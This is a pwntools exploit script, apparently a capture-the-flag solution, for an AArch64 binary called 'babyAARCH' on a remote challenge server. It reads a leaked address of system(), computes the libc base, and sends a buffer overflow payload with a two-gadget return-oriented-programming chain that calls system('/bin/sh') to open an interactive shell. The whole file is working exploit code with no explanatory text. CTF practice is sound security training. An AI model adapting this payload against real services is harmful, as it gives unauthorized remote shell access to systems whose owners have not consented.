from pwn import *

context.binary = "./babyAARCH"
binary = './babyAARCH'

p = remote("challs.pwny.shellmates.club",1000)

# p = process(["qemu-aarch64-static", "-L", "/usr/aarch64-linux-gnu/", "-g", "4444" ,binary])
# p = process(["qemu-aarch64-static", "-L", "/usr/aarch64-linux-gnu/" ,binary])
libc = ELF("libc.so.6",False)

p.recvuntil(" system @")
addr = int(p.recvuntil(" i")[:-2].decode(),16)
libc.address =  addr - libc.sym["system"]
BIN_SH = libc.address + 0x146fd0 
# print("                 ",hex(addr))


# 0x000000000002a3a8: ldp x21, x22, [sp, #0x20]; ldp x29, x30, [sp], #0x40; ret; 
# 0x0000000000050cf8 : mov x0, x21 ; blr x22
ldp_x21_x22_ldp_x29_x30 = libc.address + 0x000000000002a3a8
mov_x0_x21_blr_x22 = libc.address + 0x0000000000050cf8 
print(hex(ldp_x21_x22_ldp_x29_x30))

payload =  b"A" * 32
payload += p64(ldp_x21_x22_ldp_x29_x30)
payload += p64(0)
payload += p64(mov_x0_x21_blr_x22)
payload += b"A" * 16
payload += p64(BIN_SH)
payload += p64(addr)

p.sendline(payload    )





p.interactive()